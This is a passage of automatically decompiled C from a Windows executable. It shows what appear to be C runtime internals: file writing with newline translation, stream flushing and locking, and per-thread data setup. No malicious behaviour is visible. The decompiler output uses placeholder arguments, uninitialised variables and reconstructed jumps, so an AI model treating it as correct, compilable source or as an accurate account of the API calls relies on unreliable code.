            *(int32_t *)(v26 - 12) = v23 - v24;
            *(int32_t *)(v26 - 16) = v24 + v9;
            v11 = v26 - 20;
            *(int32_t *)v11 = *(int32_t *)(48 * (a2 & 63) + 24 + v2);
            if (!WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
                // break (via goto) -> 0x40b619
                goto lab_0x40b619;
            }
            // 0x40b5f2
            v24 += v25;
            v26 = v11;
        }
        // 0x40b602
        *v5 = v16 - a3;
        if (v16 >= v3) {
            // 0x40b621
            return function_406b2c();
        }
        v12 = (int32_t *)(v11 - 4);
        v13 = v16;
        v14 = v7;
        v15 = v14;
        v16 = v13;
        while (v13 < v3) {
            // 0x40b577
            v19 = *(int16_t *)v13;
            v17 = v14;
            if (v19 == 10) {
                // 0x40b582
                *v12 = 13;
                *(int16_t *)v14 = 13;
                v17 = v14 + 2;
            }
            // 0x40b58b
            v20 = v13 + 2;
            *(int16_t *)v17 = v19;
            v21 = v17 + 2;
            v15 = v21;
            v16 = v20;
            if (v21 >= (int32_t)&v18) {
                // break -> 0x40b598
                break;
            }
            v13 = v20;
            v14 = v21;
            v15 = v14;
            v16 = v13;
        }
        // 0x40b598
        *v12 = 0;
        *(int32_t *)(v11 - 8) = 0;
        *(int32_t *)(v11 - 12) = 3413;
        *(int32_t *)(v11 - 16) = v9;
        *(int32_t *)(v11 - 20) = (v15 - v7) / 2;
        *(int32_t *)(v11 - 24) = v7;
        *(int32_t *)(v11 - 28) = 0;
        v22 = v11 - 32;
        *(int32_t *)v22 = 0xfde9;
        v23 = WideCharToMultiByte((int32_t)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (char *)&g266, (int32_t)&g266, (char *)&g266, (bool *)&g266);
        v24 = 0;
    }
  lab_0x40b619:
    // 0x40b619
    *v4 = GetLastError();
    // 0x40b621
    return function_406b2c();
}

// Address range: 0x40b634 - 0x40b71f
int32_t function_40b634(int32_t a1) {
    // 0x40b634
    function_406cf0(&g93, 20, (int32_t)&g266);
    int32_t v1; // 0x40b634
    uint32_t v2 = *(int32_t *)(v1 + 8); // 0x40b640
    int32_t result; // 0x40b719
    if (v2 == -2) {
        // 0x40b648
        *(int32_t *)function_40b07e() = 0;
        *(int32_t *)function_40b091() = 9;
        // 0x40b719
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    if (v2 >= 0) {
        // 0x40b668
        if (v2 < g209) {
            int32_t v3 = 48 * (v2 & 63);
            int32_t * v4 = (int32_t *)(v1 - 32); // 0x40b681
            *v4 = v3;
            int32_t * v5 = (int32_t *)(4 * v2 / 64 + (int32_t)&g207); // 0x40b684
            if ((*(char *)(v3 + 40 + *v5) & 1) != 0) {
                // 0x40b695
                function_40de75(v2);
                int32_t * v6 = (int32_t *)(v1 - 28); // 0x40b69f
                *v6 = -1;
                int32_t * v7 = (int32_t *)(v1 - 4); // 0x40b6a2
                *v7 = 0;
                if ((*(char *)(*v5 + 40 + *v4) & 1) != 0) {
                    // 0x40b6cc
                    *v6 = function_40b71f(v2, *(int32_t *)(v1 + 12), *(int32_t *)(v1 + 16));
                } else {
                    // 0x40b6b7
                    *(int32_t *)function_40b091() = 9;
                    *(int32_t *)function_40b07e() = 0;
                }
                // 0x40b6e0
                *v7 = -2;
                function_40b6f6();
                // 0x40b719
                result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                return result;
            }
        }
    }
    // 0x40b6fe
    *(int32_t *)function_40b07e() = 0;
    *(int32_t *)function_40b091() = 9;
    // 0x40b719
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40b6f6 - 0x40b6fe
int32_t function_40b6f6(void) {
    // 0x40b6f6
    int32_t v1; // 0x40b6f6
    return function_40de98(v1);
}

// Address range: 0x40b71f - 0x40b92b
int32_t function_40b71f(int32_t a1, int32_t lpBuffer, int32_t nNumberOfBytesToWrite) {
    // 0x40b71f
    if (nNumberOfBytesToWrite == 0) {
        // 0x40b91b
        return function_406b2c();
    }
    if (lpBuffer == 0) {
        int32_t * v1 = (int32_t *)function_40b07e(); // 0x40b756
        *v1 = *v1 & lpBuffer;
        *(int32_t *)function_40b091() = 22;
        // 0x40b91b
        return function_406b2c();
    }
    int32_t v2 = 48 * (a1 & 63);
    int32_t * v3 = (int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40b781
    int32_t v4 = *v3; // 0x40b781
    char v5 = *(char *)(v2 + 41 + v4); // 0x40b78e
    if (v5 != 2 != v5 != 1) {
        if ((nNumberOfBytesToWrite & 1) != 0) {
            // 0x40b7a4
            *(int32_t *)function_40b07e() = 0;
            *(int32_t *)function_40b091() = 22;
            // 0x40b91b
            return function_406b2c();
        }
    }
    int32_t v6 = v2 + 40;
    int32_t v7; // bp-80, 0x40b71f
    if ((*(char *)(v4 + v6) & 32) != 0) {
        // 0x40b7cb
        v7 = a1;
        int32_t v8; // 0x40b71f
        int32_t v9; // 0x40b71f
        int32_t v10; // 0x40b71f
        function_40ec25(a1, 0, 0, 2, v10, v8, v9, lpBuffer, v4);
    }
    // 0x40b7da
    int32_t v11; // 0x40b71f
    int32_t v12; // 0x40b71f
    int32_t errorCode; // bp-24, 0x40b71f
    int32_t v13; // 0x40b71f
    if ((char)function_40b2c4(a1) == 0) {
        int32_t v14 = *v3; // 0x40b821
        if (*(char *)(v14 + v6) > -1) {
            int32_t hFile = *(int32_t *)(v2 + 24 + v14); // 0x40b878
            errorCode = 0;
            int32_t lpNumberOfBytesWritten = 0; // bp-20, 0x40b882
            v7 = lpBuffer;
            int32_t v15 = hFile; // bp-84, 0x40b890
            if (!WriteFile((int32_t *)hFile, (int32_t *)lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL)) {
                // 0x40b89b
                errorCode = GetLastError();
            }
            // 0x40b8a4
            v12 = &v15;
            v13 = &errorCode;
            goto lab_0x40b8a7;
        } else {
            if (v5 == 0) {
                // 0x40b868
                v7 = &errorCode;
                v11 = function_40b33a(&errorCode, a1, lpBuffer, nNumberOfBytesToWrite);
                goto lab_0x40b819;
            } else {
                int32_t v16 = (int32_t)v5 - 1; // 0x40b83a
                if (v16 == 0) {
                    // 0x40b858
                    v7 = &errorCode;
                    v11 = function_40b507(&errorCode, a1, lpBuffer, nNumberOfBytesToWrite);
                    goto lab_0x40b819;
                } else {
                    if (v16 != 1) {
                        goto lab_0x40b8e2;
                    } else {
                        // 0x40b848
                        v7 = &errorCode;
                        v11 = function_40b419(&errorCode, a1, lpBuffer, nNumberOfBytesToWrite);
                        goto lab_0x40b819;
                    }
                }
            }
        }
    } else {
        if (v5 == 0) {
            // 0x40b80b
            v7 = &errorCode;
            v11 = function_40b0a4(&errorCode, a1, lpBuffer, nNumberOfBytesToWrite);
            goto lab_0x40b819;
        } else {
            if (v5 < 3) {
                int32_t v17 = function_40b257(&errorCode, lpBuffer, nNumberOfBytesToWrite); // 0x40b7fc
            } else {
                goto lab_0x40b8e2;
            }
        }
    }
  lab_0x40b8a7:;
    int32_t v18 = *(int32_t *)v13; // bp-44, 0x40b8aa
    bool v19; // 0x40b71f
    int32_t v20 = v19 ? -4 : 4; // 0x40b8aa
    int32_t v21 = v20 + (int32_t)&v18; // 0x40b8aa
    int32_t v22 = v13 + v20; // 0x40b8aa
    *(int32_t *)v21 = *(int32_t *)v22;
    *(int32_t *)(v21 + v20) = *(int32_t *)(v22 + v20);
    int32_t v23; // 0x40b71f
    if (v23 != 0) {
        // 0x40b91b
        return function_406b2c();
    }
    // 0x40b8b4
    if (v18 != 0) {
        int32_t * v24 = (int32_t *)(v12 - 4); // 0x40b8bb
        *v24 = 5;
        if (v18 != 5) {
            // 0x40b8d6
            *v24 = v18;
            function_40b05b();
        } else {
            // 0x40b8c2
            *(int32_t *)function_40b091() = 9;
            *(int32_t *)function_40b07e() = 5;
        }
        // 0x40b91b
        return function_406b2c();
    }
    goto lab_0x40b8e2;
  lab_0x40b819:
    // 0x40b819
    v12 = (int32_t)&v7 + 16;
    v13 = v11;
    goto lab_0x40b8a7;
  lab_0x40b8e2:
    // 0x40b8e2
    if ((*(char *)(*v3 + v6) & 64) != 0) {
        // 0x40b8f6
        if (*(char *)lpBuffer == 26) {
            // 0x40b91b
            return function_406b2c();
        }
    }
    // 0x40b8ff
    *(int32_t *)function_40b091() = 28;
    *(int32_t *)function_40b07e() = 0;
    // 0x40b91b
    return function_406b2c();
}

// Address range: 0x40b92b - 0x40b92c
int32_t function_40b92b(int32_t a1) {
    // 0x40b92b
    int32_t result; // 0x40b92b
    return result;
}

// Address range: 0x40b92d - 0x40b951
int32_t function_40b92d(int32_t a1) {
    if (a1 != 0) {
        // 0x40b94c
        return *(int32_t *)(a1 + 16);
    }
    // 0x40b937
    *(int32_t *)function_40b091() = 22;
    return -1;
}

// Address range: 0x40b951 - 0x40ba19
int32_t function_40b951(void) {
    int32_t v1 = g202; // 0x40b951
    int32_t v2 = 3; // bp-8, 0x40b957
    int32_t v3 = 512; // 0x40b95c
    int32_t v4; // 0x40b951
    if (v1 != 0) {
        // 0x40b965
        v3 = 3;
        v4 = v1;
        if (v1 < 3) {
            goto lab_0x40b96b;
        } else {
            goto lab_0x40b970;
        }
    } else {
        goto lab_0x40b96b;
    }
  lab_0x40b96b:
    // 0x40b96b
    g202 = v3;
    v4 = v3;
    goto lab_0x40b970;
  lab_0x40b970:
    // 0x40b970
    v2 = 4;
    g203 = function_40ca21(v4, 4);
    function_40c15c(0);
    if (g203 == 0) {
        // 0x40b990
        v2 = 4;
        g202 = 3;
        g203 = function_40ca21(3, 4);
        function_40c15c(0);
        if (g203 == 0) {
            // 0x40b9b6
            return -1;
        }
    }
    int32_t v5 = &v2; // 0x40b9be
    int32_t v6 = 0; // 0x40b9be
    int32_t v7 = &g120;
    *(int32_t *)(v5 - 4) = 0;
    *(int32_t *)(v5 - 8) = 4000;
    int32_t v8 = v5 - 12; // 0x40b9cd
    *(int32_t *)v8 = v7 + 32;
    function_40c7f8((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    *(int32_t *)(g203 + 4 * v6) = v7;
    int32_t v9 = *(int32_t *)(4 * v6 / 64 + (int32_t)&g207); // 0x40b9e8
    uint32_t v10 = *(int32_t *)(48 * (v6 & 63) + 24 + v9); // 0x40b9ef
    if (v10 < 0xfffffffe != v10 != 0) {
        // 0x40ba01
        *(int32_t *)(v7 + 16) = -2;
    }
    int32_t v11 = v7 + 56; // 0x40ba08
    v5 = v8;
    v6++;
    while (v11 != (int32_t)&g121) {
        // 0x40b9c3
        v7 = v11;
        *(int32_t *)(v5 - 4) = 0;
        *(int32_t *)(v5 - 8) = 4000;
        v8 = v5 - 12;
        *(int32_t *)v8 = v7 + 32;
        function_40c7f8((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        *(int32_t *)(g203 + 4 * v6) = v7;
        v9 = *(int32_t *)(4 * v6 / 64 + (int32_t)&g207);
        v10 = *(int32_t *)(48 * (v6 & 63) + 24 + v9);
        if (v10 < 0xfffffffe != v10 != 0) {
            // 0x40ba01
            *(int32_t *)(v7 + 16) = -2;
        }
        // 0x40ba08
        v11 = v7 + 56;
        v5 = v8;
        v6++;
    }
    // 0x40b9b6
    return 0;
}

// Address range: 0x40ba1b - 0x40ba65
int32_t function_40ba1b(void) {
    // 0x40ba1b
    int32_t v1; // 0x40ba1b
    function_40bb3a(v1);
    function_40ec85();
    int32_t v2; // bp-4, 0x40ba1b
    int32_t v3 = &v2; // 0x40ba26
    int32_t v4; // 0x40ba1b
    for (int32_t i = 0; i < 9; i += 4) {
        // 0x40ba28
        v4 = v3;
        v3 = v4 - 4;
        int32_t * v5 = (int32_t *)v3; // 0x40ba2d
        *v5 = *(int32_t *)(g203 + i);
        function_40ed25((int32_t)&g266);
        *v5 = *(int32_t *)(g203 + i) + 32;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
    }
    // 0x40ba50
    *(int32_t *)(v4 - 8) = g203;
    int32_t result = function_40c15c((int32_t)&g266); // 0x40ba56
    g203 = 0;
    return result;
}

// Address range: 0x40ba65 - 0x40ba79
int32_t function_40ba65(int32_t a1) {
    // 0x40ba65
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)(a1 + 32));
    return &g266;
}

// Address range: 0x40ba79 - 0x40ba8d
int32_t function_40ba79(int32_t a1) {
    // 0x40ba79
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)(a1 + 32));
    return &g266;
}

// Address range: 0x40ba8d - 0x40baf3
int32_t function_40ba8d(int32_t a1, int32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x40ba99
    int32_t v2 = *v1; // 0x40ba99
    if ((v2 & 3) != 2 || (v2 & 192) == 0) {
        // 0x40baf0
        return 0;
    }
    int32_t v3 = *(int32_t *)(a1 + 4); // 0x40baab
    int32_t * v4 = (int32_t *)a1; // 0x40baaf
    int32_t v5 = *v4 - v3; // 0x40bab1
    *v4 = v3;
    *(int32_t *)(a1 + 8) = 0;
    if (v5 < 1) {
        // 0x40baf0
        return 0;
    }
    int32_t v6 = function_40b634(function_40b92b(a1)); // 0x40bac7
    int32_t v7 = *v1;
    if (v5 != v6) {
        // 0x40bad3
        *v1 = v7 | 16;
        // 0x40baf0
        return -1;
    }
    // 0x40bade
    if ((v7 & 4) != 0) {
        // 0x40bae7
        *v1 = v7 & -3;
    }
    // 0x40baf0
    return 0;
}

// Address range: 0x40baf3 - 0x40bb3a
int32_t function_40baf3(int32_t a1) {
    // 0x40baf3
    if (a1 == 0) {
        // 0x40bb37
        return function_40bb43(a1);
    }
    // 0x40bb09
    int32_t v1; // 0x40baf3
    int32_t v2; // 0x40baf3
    if (function_40ba8d(a1, v1, v2) != 0) {
        // 0x40bb37
        return -1;
    }
    // 0x40bb19
    if ((*(int32_t *)(a1 + 12) & 2048) == 0) {
        // 0x40bb37
        return 0;
    }
    int32_t v3 = function_40b92b(a1); // 0x40bb24
    if (function_40ee23(v3) != 0) {
        // 0x40bb37
        return -1;
    }
    // 0x40bb37
    return 0;
}

// Address range: 0x40bb3a - 0x40bb43
int32_t function_40bb3a(int32_t a1) {
    // 0x40bb3a
    return function_40bb43(1);
}

// Address range: 0x40bb43 - 0x40bc0f
int32_t function_40bb43(int32_t a1) {
    int32_t v1 = &g94; // bp-8, 0x40bb45
    function_406cf0(&g94, 28, (int32_t)&g266);
    int32_t v2; // 0x40bb43
    int32_t * v3 = (int32_t *)(v2 - 28); // 0x40bb4f
    *v3 = 0;
    int32_t * v4 = (int32_t *)(v2 - 36); // 0x40bb53
    *v4 = 0;
    function_40c527(8);
    int32_t * v5 = (int32_t *)(v2 - 4); // 0x40bb5f
    *v5 = 0;
    int32_t v6 = 4 * g202; // 0x40bb6e
    int32_t v7 = v6 + g203; // 0x40bb6e
    int32_t * v8 = (int32_t *)(v2 - 44); // 0x40bb71
    *v8 = v7;
    int32_t v9 = *(int32_t *)(v2 + 8); // 0x40bb74
    int32_t * v10 = (int32_t *)(v2 - 32); // 0x40bb77
    *v10 = g203;
    int32_t result; // 0x40bc09
    if (v6 == 0) {
        // 0x40bbf2
        *v5 = -2;
        function_40bc12();
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t * v11 = (int32_t *)((int32_t)&v1 - 4);
    int32_t v12 = g203; // 0x40bbdd
    int32_t v13 = *(int32_t *)v12; // 0x40bb7e
    *(int32_t *)(v2 - 40) = v13;
    int32_t v14 = v7; // 0x40bb85
    int32_t v15; // 0x40bb95
    int32_t v16; // 0x40bbc3
    if (v13 != 0) {
        // 0x40bb87
        *v11 = v13;
        function_40ba65((int32_t)&g266);
        *v5 = 1;
        v15 = *(int32_t *)(v13 + 12);
        if ((v15 & 0x2000) != 0) {
            if (v9 != 1) {
                if (v9 == 0 && (v15 & 2) != 0) {
                    // 0x40bbc2
                    *v11 = v13;
                    v16 = function_40baf3((int32_t)&g266);
                    if (v16 == -1) {
                        // 0x40bbce
                        *v4 = *v4 | v16;
                    }
                }
            } else {
                // 0x40bba4
                *v11 = v13;
                if (function_40baf3((int32_t)&g266) != -1) {
                    // 0x40bbb0
                    *v3 = *v3 + 1;
                }
            }
        }
        // 0x40bbd1
        *v5 = 0;
        function_40bbe8();
        v14 = *v8;
    }
    // 0x40bbdd
    v12 += 4;
    *v10 = v12;
    while (v12 != v14) {
        // 0x40bb7e
        v13 = *(int32_t *)v12;
        *(int32_t *)(v2 - 40) = v13;
        if (v13 != 0) {
            // 0x40bb87
            *v11 = v13;
            function_40ba65((int32_t)&g266);
            *v5 = 1;
            v15 = *(int32_t *)(v13 + 12);
            if ((v15 & 0x2000) != 0) {
                if (v9 != 1) {
                    if (v9 == 0 && (v15 & 2) != 0) {
                        // 0x40bbc2
                        *v11 = v13;
                        v16 = function_40baf3((int32_t)&g266);
                        if (v16 == -1) {
                            // 0x40bbce
                            *v4 = *v4 | v16;
                        }
                    }
                } else {
                    // 0x40bba4
                    *v11 = v13;
                    if (function_40baf3((int32_t)&g266) != -1) {
                        // 0x40bbb0
                        *v3 = *v3 + 1;
                    }
                }
            }
            // 0x40bbd1
            *v5 = 0;
            function_40bbe8();
            v14 = *v8;
        }
        // 0x40bbdd
        v12 += 4;
        *v10 = v12;
    }
    // 0x40bbf2
    *v5 = -2;
    function_40bc12();
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40bbe8 - 0x40bbf2
int32_t function_40bbe8(void) {
    // 0x40bbe8
    int32_t v1; // 0x40bbe8
    return function_40ba79(*(int32_t *)(v1 - 40));
}

// Address range: 0x40bc12 - 0x40bc1b
int32_t function_40bc12(void) {
    // 0x40bc12
    return function_40c56f(8);
}

// Address range: 0x40bc1b - 0x40bc41
int32_t function_40bc1b(int32_t a1, int32_t a2) {
    int32_t v1 = function_40bfb3(); // 0x40bc21
    int32_t v2 = *(int32_t *)(v1 + 76); // bp-8, 0x40bc29
    function_40c102(v1, (int32_t)&v2);
    return *(int32_t *)v2;
}

// Address range: 0x40bc41 - 0x40bc85
int32_t function_40bc41(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40bc41
    function_406cf0(&g96, 8, (int32_t)&g266);
    int32_t v1; // 0x40bc41
    function_40c527(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40bc58
    *v2 = 0;
    int32_t v3 = *(int32_t *)(v1 + 12); // 0x40bc5c
    int32_t v4 = *(int32_t *)*(int32_t *)*(int32_t *)(v3 + 4); // 0x40bc64
    function_40bf68(*(int32_t *)*(int32_t *)v3, v4);
    *v2 = -2;
    function_40bc85();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40bc7d
    return result;
}

// Address range: 0x40bc85 - 0x40bc91
int32_t function_40bc85(void) {
    // 0x40bc85
    int32_t v1; // 0x40bc85
    return function_40c56f(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40bc91 - 0x40bce6
int32_t function_40bc91(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40bc91
    function_406cf0(&g97, 8, (int32_t)&g266);
    int32_t v1; // 0x40bc91
    function_40c527(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40bca8
    *v2 = 0;
    int32_t v3 = *(int32_t *)*(int32_t *)(v1 + 12); // 0x40bcaf
    int32_t v4 = *(int32_t *)(*(int32_t *)v3 + 72); // 0x40bcb3
    int32_t result; // 0x40bcde
    if (v4 == 0) {
        // 0x40bcd2
        *v2 = -2;
        function_40bce6();
        result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t * v5 = (int32_t *)v4; // 0x40bcbd
    int32_t v6 = *v5 - 1; // 0x40bcbd
    *v5 = v6;
    if (v4 != (int32_t)&g131 && v6 == 0) {
        // 0x40bccb
        function_40c15c(v4);
    }
    // 0x40bcd2
    *v2 = -2;
    function_40bce6();
    result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40bce6 - 0x40bcf2
int32_t function_40bce6(void) {
    // 0x40bce6
    int32_t v1; // 0x40bce6
    return function_40c56f(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40bcf2 - 0x40bd31
int32_t function_40bcf2(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40bcf2
    function_406cf0(&g98, 8, (int32_t)&g266);
    int32_t v1; // 0x40bcf2
    function_40c527(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40bd09
    *v2 = 0;
    function_40bf68(*(int32_t *)*(int32_t *)*(int32_t *)(v1 + 12), 0);
    *v2 = -2;
    function_40bd31();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40bd29
    return result;
}

// Address range: 0x40bd31 - 0x40bd3d
int32_t function_40bd31(void) {
    // 0x40bd31
    int32_t v1; // 0x40bd31
    return function_40c56f(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40bd3d - 0x40bd79
int32_t function_40bd3d(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40bd3d
    function_406cf0(&g95, 8, (int32_t)&g266);
    int32_t v1; // 0x40bd3d
    function_40c527(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v2 = (int32_t *)(v1 - 4); // 0x40bd54
    *v2 = 0;
    int32_t v3 = *(int32_t *)*(int32_t *)(v1 + 12); // 0x40bd5b
    int32_t * v4 = (int32_t *)*(int32_t *)(*(int32_t *)v3 + 72); // 0x40bd62
    *v4 = *v4 + 1;
    *v2 = -2;
    function_40bd79();
    int32_t result = function_406d36((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40bd71
    return result;
}

// Address range: 0x40bd79 - 0x40bd85
int32_t function_40bd79(void) {
    // 0x40bd79
    int32_t v1; // 0x40bd79
    return function_40c56f(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40bd85 - 0x40bd86
int32_t function_40bd85(int32_t a1, int32_t * a2) {
    // 0x40bd85
    int32_t result; // 0x40bd85
    return result;
}

// Address range: 0x40bd87 - 0x40bdad
int32_t function_40bd87(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-12, 0x40bd93
    int32_t v2 = a1; // bp-16, 0x40bd96
    int32_t v3; // 0x40bd87
    return function_40bc91(&v2, a2, &v1, a1, a1, v3);
}

// Address range: 0x40bdad - 0x40bdd5
int32_t function_40bdad(int32_t a1, int32_t * a2) {
    int32_t v1 = a1; // bp-12, 0x40bdbb
    int32_t v2 = a1; // bp-16, 0x40bdbe
    int32_t v3; // 0x40bdad
    return function_40bc41(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40bdd5 - 0x40bdd6
int32_t function_40bdd5(int32_t a1, int32_t * a2) {
    // 0x40bdd5
    int32_t result; // 0x40bdd5
    return result;
}

// Address range: 0x40bdd7 - 0x40bdfd
int32_t function_40bdd7(int32_t a1, int32_t a2) {
    int32_t v1 = a1; // bp-12, 0x40bde3
    int32_t v2 = a1; // bp-16, 0x40bde6
    int32_t v3; // 0x40bdd7
    return function_40bcf2(&v2, a2, &v1, a1, a1, v3);
}

// Address range: 0x40bdfd - 0x40be25
int32_t function_40bdfd(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5) {
    int32_t v1 = a1; // bp-12, 0x40be0b
    int32_t v2 = a1; // bp-16, 0x40be0e
    int32_t v3; // 0x40bdfd
    return function_40bd3d(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40be25 - 0x40be9e
int32_t function_40be25(int32_t a1) {
    int32_t v1 = a1;
    *(int32_t *)(a1 + 24) = 1;
    *(int32_t *)v1 = (int32_t)&g31;
    *(int32_t *)(v1 + 848) = 1;
    *(int32_t *)(v1 + 72) = (int32_t)&g131;
    *(int16_t *)(v1 + 108) = 67;
    *(int16_t *)(v1 + 370) = 67;
    *(int32_t *)(v1 + 844) = 0;
    int32_t v2 = &v1; // 0x40be72
    int32_t v3 = v2; // bp-8, 0x40be72
    int32_t v4; // bp-12, 0x40be25
    int32_t v5; // 0x40be25
    function_40bdfd(5, &v3, v4, &v1, v5);
    v4 = v2;
    int32_t v6; // 0x40be25
    v3 = &v6;
    return function_40bdad(4, &v4);
}

// Address range: 0x40bea0 - 0x40bebf
int32_t function_40bea0(int32_t a1) {
    // 0x40bea0
    int32_t result; // 0x40bea0
    if (a1 != 0) {
        // 0x40bea9
        int32_t v1; // 0x40bea0
        function_40bebf(a1, v1);
        result = function_40c15c(a1);
    }
    // 0x40bebb
    return result;
}

// Address range: 0x40bebf - 0x40bf68
int32_t function_40bebf(int32_t a1, int32_t a2) {
    int32_t v1 = a1;
    int32_t v2 = *(int32_t *)a1; // 0x40bec8
    v1 = a1;
    if (v2 != (int32_t)&g31) {
        // 0x40bed2
        function_40c15c(v2);
    }
    // 0x40bedc
    function_40c15c(*(int32_t *)(v1 + 60));
    function_40c15c(*(int32_t *)(v1 + 48));
    function_40c15c(*(int32_t *)(v1 + 52));
    function_40c15c(*(int32_t *)(v1 + 56));
    function_40c15c(*(int32_t *)(v1 + 40));
    function_40c15c(*(int32_t *)(v1 + 44));
    function_40c15c(*(int32_t *)(v1 + 64));
    function_40c15c(*(int32_t *)(v1 + 68));
    function_40c15c(*(int32_t *)(v1 + 864));
    int32_t v3 = &v1; // 0x40bf42
    int32_t v4 = v3; // bp-8, 0x40bf42
    function_40bd85(5, &v4);
    v4 = v3;
    return function_40bdd5(4, &v4);
}

// Address range: 0x40bf68 - 0x40bfb3
int32_t function_40bf68(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)(a1 + 76); // 0x40bf71
    int32_t v2 = *v1; // 0x40bf71
    if (v2 != 0) {
        // 0x40bf77
        function_40e5c3(v2);
        int32_t v3 = *v1; // 0x40bf7f
        if (v3 != (int32_t)&g122 && v3 != g206) {
            // 0x40bf92
            if (*(int32_t *)(v3 + 12) == 0) {
                // 0x40bf98
                function_40e3f7(v3);
            }
        }
    }
    // 0x40bf9f
    *v1 = a2;
    int32_t result = 0; // 0x40bfa8
    if (a2 != 0) {
        // 0x40bfaa
        result = function_40e37a(a2);
    }
    // 0x40bfb1
    return result;
}

// Address range: 0x40bfb3 - 0x40c036
int32_t function_40bfb3(void) {
    int32_t errorCode = GetLastError(); // 0x40bfb7
    int32_t v1; // bp-8, 0x40bfb3
    int32_t v2 = &v1; // 0x40bfc7
    if (g121 != -1) {
        int32_t v3 = g121; // bp-12, 0x40bfc9
        v2 = &v3;
        int32_t result = function_40c749(g121); // 0x40bfca
        if (result != 0) {
            // 0x40c01e
            *(int32_t *)(v2 - 4) = errorCode;
            SetLastError((int32_t)&g266);
            return result;
        }
    }
    int32_t * v4 = (int32_t *)(v2 - 4);
    *v4 = 868;
    int32_t v5 = v2 - 8; // 0x40bfda
    int32_t * v6 = (int32_t *)v5; // 0x40bfda
    *v6 = 1;
    int32_t result2 = function_40ca21((int32_t)&g266, (int32_t)&g266); // 0x40bfdc
    *v4 = result2;
    int32_t * v7 = v4; // 0x40bfe7
    if (result2 != 0) {
        // 0x40bff2
        *v6 = g121;
        int32_t v8 = function_40c79f((int32_t)&g266, (int32_t)&g266); // 0x40bff9
        v7 = (int32_t *)(v2 - 12);
        if (v8 != 0) {
            // 0x40c005
            *v7 = (int32_t)&g206;
            *(int32_t *)(v2 - 16) = result2;
            function_40be25((int32_t)&g266);
            *(int32_t *)(v2 - 20) = 0;
            function_40c15c((int32_t)&g266);
            // 0x40c01e
            *(int32_t *)(v5 - 4) = errorCode;
            SetLastError((int32_t)&g266);
            return result2;
        }
        // 0x40c002
        *v7 = result2;
    }
    // 0x40c02a
    function_40c15c((int32_t)&g266);
    *v7 = errorCode;
    SetLastError((int32_t)&g266);
    function_40af0b();
    // UNREACHABLE
}

// Address range: 0x40c037 - 0x40c0bc
int32_t function_40c037(void) {
    int32_t errorCode = GetLastError(); // 0x40c03c
    int32_t v1; // bp-12, 0x40c037
    int32_t v2 = &v1; // 0x40c04e
    int32_t result; // 0x40c037
    int32_t v3; // 0x40c037
    if (g121 == -1) {
        goto lab_0x40c05c;
    } else {
        int32_t v4 = g121; // bp-16, 0x40c050
        v2 = &v4;
        int32_t v5 = function_40c749(g121); // 0x40c051
        v3 = v2;
        result = v5;
        if (v5 != 0) {
            goto lab_0x40c0ad;
        } else {
            goto lab_0x40c05c;
        }
    }
  lab_0x40c05c:;
    int32_t * v6 = (int32_t *)(v2 - 4);
    *v6 = 868;
    int32_t v7 = v2 - 8; // 0x40c061
    int32_t * v8 = (int32_t *)v7; // 0x40c061
    *v8 = 1;
    int32_t v9 = function_40ca21((int32_t)&g266, (int32_t)&g266); // 0x40c063
    int32_t * v10; // 0x40c037
    if (v9 != 0) {
        // 0x40c079
        *v6 = v9;
        *v8 = g121;
